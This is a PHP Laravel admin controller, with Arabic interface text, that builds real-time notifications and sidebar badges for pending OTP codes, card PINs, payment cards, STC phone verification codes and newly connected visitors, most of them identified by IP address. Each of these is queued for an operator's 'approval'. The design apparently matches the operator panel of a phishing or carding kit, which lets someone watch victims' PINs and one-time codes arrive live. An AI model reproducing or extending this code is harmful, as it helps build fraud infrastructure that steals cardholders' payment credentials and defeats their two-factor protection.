<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\AdminDashboardSession;
use App\Models\CustomerActivity;
use App\Models\CustomerProfile;
use App\Models\LoginAttempt;
use App\Models\OtpCode;
use App\Models\PaymentCard;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;

class AdminNotificationController extends Controller
{
    private const RAW_CACHE_KEY = 'admin:notifications:raw';
    private const BADGE_CACHE_KEY = 'admin:badge_counts';
    private const PHONE_OTP_TYPES = ['phone', 'phone_verification', 'stc_verification', 'stc_otp'];
    private const BADGE_OTP_TYPES = ['otp', 'pin', 'phone', 'phone_verification', 'stc_verification', 'stc_otp'];

    /**
     * Build a stable unique key for a notification item.
     */
    private function notifKey(string $type, int $entityId): string
    {
        return "{$type}-{$entityId}";
    }

    private function phoneNotificationMessage(OtpCode $otp, string $name): string
    {
        return match ($otp->type) {
            'stc_otp' => "رمز STC OTP جديد من {$name} بانتظار الموافقة",
            'stc_verification' => "تحقق STC جديد من {$name} بانتظار الموافقة",
            default => "تحقق هاتفي من {$name} بانتظار الموافقة",
        };
    }

    /**
     * Get real-time notifications for the admin dashboard.
     * Read state is persisted in AdminDashboardSession.dismissed_notifications.
     */
    public function index(Request $request): JsonResponse
    {
        $dismissed = [];
        if (Auth::check()) {
            $session = AdminDashboardSession::getOrCreateForAdmin(Auth::id());
            $dismissed = $session->dismissed_notifications ?? [];
        }
        $dismissedSet = array_flip($dismissed);

        // Cache the raw notification data briefly — all admins share the same pending items.
        // Only the read/unread state is per-admin (applied via $dismissedSet after cache).
        $rawNotifications = Cache::remember(self::RAW_CACHE_KEY, 5, function () {
            return [
                'otps' => OtpCode::pending()->ofType('otp')
                    ->with('customer:id,full_name,ip_address')
                    ->latest()->take(10)->get(),
                'pins' => OtpCode::pending()->ofType('pin')
                    ->with('customer:id,full_name,ip_address')
                    ->latest()->take(10)->get(),
                'cards' => PaymentCard::pending()
                    ->with('customer:id,full_name,ip_address')
                    ->latest()->take(10)->get(),
                'customers' => CustomerProfile::where('created_at', '>=', now()->subMinutes(30))
                    ->where('is_active', true)
                    ->latest()->take(5)
                    ->get(['id', 'full_name', 'ip_address', 'created_at']),
                'phones' => OtpCode::pending()->whereIn('type', self::PHONE_OTP_TYPES)
                    ->with('customer:id,full_name,ip_address')
                    ->latest()->take(10)->get(),
            ];
        });

        $notifications = [];
        $id = 0;

        // 1. Pending OTPs
        foreach ($rawNotifications['otps'] as $otp) {
            $name = $otp->customer?->full_name ?? $otp->customer?->ip_address ?? 'عميل';
            $key = $this->notifKey('otp', $otp->id);
            $notifications[] = [
                'id' => ++$id,
                'type' => 'otp',
                'icon' => 'fa-key',
                'message' => "رمز OTP جديد من {$name} بانتظار الموافقة",
                'time' => $otp->created_at->diffForHumans(),
                'created_at' => $otp->created_at->toIso8601String(),
                'created_at_ts' => $otp->created_at->timestamp,
                'read' => isset($dismissedSet[$key]),
                'key' => $key,
                'meta' => [
                    'otp_id' => $otp->id,
                    'customer_id' => $otp->customer?->id,
                    'customer_ip' => $otp->customer?->ip_address ?? '',
                ],
            ];
        }

        // 2. Pending PINs
        foreach ($rawNotifications['pins'] as $pin) {
            $name = $pin->customer?->full_name ?? $pin->customer?->ip_address ?? 'عميل';
            $key = $this->notifKey('pin', $pin->id);
            $notifications[] = [
                'id' => ++$id,
                'type' => 'pin',
                'icon' => 'fa-credit-card',
                'message' => "رقم PIN جديد من {$name} بانتظار الموافقة",
                'time' => $pin->created_at->diffForHumans(),
                'created_at' => $pin->created_at->toIso8601String(),
                'created_at_ts' => $pin->created_at->timestamp,
                'read' => isset($dismissedSet[$key]),
                'key' => $key,
                'meta' => [
                    'otp_id' => $pin->id,
                    'customer_id' => $pin->customer?->id,
                    'customer_ip' => $pin->customer?->ip_address ?? '',
                ],
            ];
        }

        // 3. Pending payment cards
        foreach ($rawNotifications['cards'] as $card) {
            $name = $card->customer?->full_name ?? $card->customer?->ip_address ?? 'عميل';
            $key = $this->notifKey('payment', $card->id);
            $notifications[] = [
                'id' => ++$id,
                'type' => 'payment',
                'icon' => 'fa-wallet',
                'message' => "بطاقة دفع جديدة من {$name} بانتظار المراجعة",
                'time' => $card->created_at->diffForHumans(),
                'created_at' => $card->created_at->toIso8601String(),
                'created_at_ts' => $card->created_at->timestamp,
                'read' => isset($dismissedSet[$key]),
                'key' => $key,
                'meta' => [
                    'card_id' => $card->id,
                    'customer_id' => $card->customer?->id,
                    'customer_ip' => $card->customer?->ip_address ?? '',
                ],
            ];
        }

        // 4. New active customers (last 30 min)
        foreach ($rawNotifications['customers'] as $customer) {
            $name = $customer->full_name ?? $customer->ip_address;
            $key = $this->notifKey('customer', $customer->id);
            $notifications[] = [
                'id' => ++$id,
                'type' => 'customer',
                'icon' => 'fa-user-plus',
                'message' => "عميل جديد متصل: {$name}",
                'time' => $customer->created_at->diffForHumans(),
                'created_at' => $customer->created_at->toIso8601String(),
                'created_at_ts' => $customer->created_at->timestamp,
                'read' => isset($dismissedSet[$key]),
                'key' => $key,
                'meta' => [
                    'customer_id' => $customer->id,
                    'customer_ip' => $customer->ip_address,
                ],
            ];
        }

        // 5. Phone verifications pending
        foreach ($rawNotifications['phones'] as $phone) {
            $name = $phone->customer?->full_name ?? $phone->customer?->ip_address ?? 'عميل';
            $key = $this->notifKey('phone', $phone->id);
            $notifications[] = [
                'id' => ++$id,
                'type' => 'phone',
                'icon' => 'fa-phone',
                'message' => $this->phoneNotificationMessage($phone, $name),
                'time' => $phone->created_at->diffForHumans(),
                'created_at' => $phone->created_at->toIso8601String(),
                'created_at_ts' => $phone->created_at->timestamp,
                'read' => isset($dismissedSet[$key]),
                'key' => $key,
                'meta' => [
                    'otp_id' => $phone->id,
                    'customer_id' => $phone->customer?->id,
                    'customer_ip' => $phone->customer?->ip_address ?? '',
                ],
            ];
        }

        // Sort: unread first, then by newest
        /**
         * @var list<array{
         *     id: int,
         *     type: string,
         *     icon: string,
         *     message: string,
         *     time: mixed,
         *     created_at: mixed,
         *     created_at_ts: int,
         *     read: bool,
         *     key: string,
         *     meta: array<string, mixed>
         * }> $notifications
         */
        usort($notifications, function ($a, $b) {
            if ($a['read'] !== $b['read']) {
                return $a['read'] ? 1 : -1;
            }

            return $b['created_at_ts'] <=> $a['created_at_ts'];
        });

        return response()->json([
            'success' => true,
            'data' => $notifications,
            'unread_count' => collect($notifications)->where('read', false)->count(),
        ]);
    }

    /**
     * Mark all notifications as read — persists keys in dismissed_notifications.
     */
    public function markRead(Request $request): JsonResponse
    {
        if (! Auth::check()) {
            return response()->json(['success' => false], 401);
        }

        $session = AdminDashboardSession::getOrCreateForAdmin(Auth::id());

        // Collect all current notification keys in bulk.
        // Combine OTP types into a single query instead of 3 separate ones.
        $otpKeys = OtpCode::pending()
            ->whereIn('type', self::BADGE_OTP_TYPES)
            ->pluck('type', 'id')
            ->map(fn ($type, $id) => $this->notifKey(in_array($type, self::PHONE_OTP_TYPES, true) ? 'phone' : $type, $id))
            ->values()
            ->all();

        $cardKeys = PaymentCard::pending()
            ->pluck('id')
            ->map(fn ($id) => $this->notifKey('payment', $id))
            ->all();

        $customerKeys = CustomerProfile::where('created_at', '>=', now()->subMinutes(30))
            ->where('is_active', true)
            ->pluck('id')
            ->map(fn ($id) => $this->notifKey('customer', $id))
            ->all();

        $keys = array_merge($otpKeys, $cardKeys, $customerKeys);

        $existing = $session->dismissed_notifications ?? [];
        $merged = array_values(array_unique(array_merge($existing, $keys)));
        $session->update(['dismissed_notifications' => $merged]);
        $session->recordVisit();

        return response()->json(['success' => true]);
    }

    /**
     * Mark a single notification as read by its key.
     */
    public function markSingleRead(Request $request): JsonResponse
    {
        $key = trim((string) $request->input('key', ''));
        if (! $key || ! Auth::check()) {
            return response()->json(['success' => false], 400);
        }

        if (! preg_match('/^(otp|pin|payment|customer|phone)-\d+$/', $key)) {
            return response()->json([
                'success' => false,
                'message' => 'مفتاح الإشعار غير صالح',
            ], 422);
        }

        $session = AdminDashboardSession::getOrCreateForAdmin(Auth::id());
        $session->dismissNotification($key);

        return response()->json(['success' => true]);
    }

    /**
     * Badge counts for sidebar — returns new/pending items per section.
     * Uses AdminDashboardSession.last_seen_counts to track what admin has seen.
     */
    public function badgeCounts(Request $request): JsonResponse
    {
        $session = AdminDashboardSession::getOrCreateForAdmin(Auth::id());
        $lastSeen = $session->last_seen_counts ?? [];

        // Cache badge counts for 15 seconds — prevents repeated COUNT(*) queries on rapid polling
        $counts = Cache::remember(self::BADGE_CACHE_KEY, 15, fn () => $this->currentBadgeTotals());

        $badges = [];
        foreach ($counts as $key => $total) {
            $seen = $lastSeen[$key] ?? 0;
            $badges[$key] = max(0, $total - $seen);
        }

        return response()->json([
            'success' => true,
            'badges' => $badges,
            'totals' => $counts,
        ]);
    }

    /**
     * Mark a section as seen — resets that section's badge to zero
     */
    public function badgeSeen(Request $request, string $section): JsonResponse
    {
        $session = AdminDashboardSession::getOrCreateForAdmin(Auth::id());
        $lastSeen = $session->last_seen_counts ?? [];

        // Reuse cached counts when marking a section as seen
        $currentCounts = Cache::remember(self::BADGE_CACHE_KEY, 15, fn () => $this->currentBadgeTotals());

        if (array_key_exists($section, $currentCounts)) {
            $lastSeen[$section] = $currentCounts[$section];
            $session->update([
                'last_seen_counts' => $lastSeen,
            ]);
        }

        return response()->json(['success' => true]);
    }

    /**
     * Current sidebar badge totals before per-admin "seen" subtraction.
     *
     * @return array{customer_activity: int, login_attempts: int, notifications: int}
     */
    private function currentBadgeTotals(): array
    {
        $otpPending = OtpCode::pending()
            ->whereIn('type', self::BADGE_OTP_TYPES)
            ->count();

        return [
            'customer_activity' => CustomerActivity::active()->where('created_at', '>=', now()->subHours(1))->count(),
            'login_attempts' => LoginAttempt::failed()->where('created_at', '>=', now()->subHours(24))->count(),
            'notifications' => $otpPending + PaymentCard::pending()->count(),
        ];
    }
}
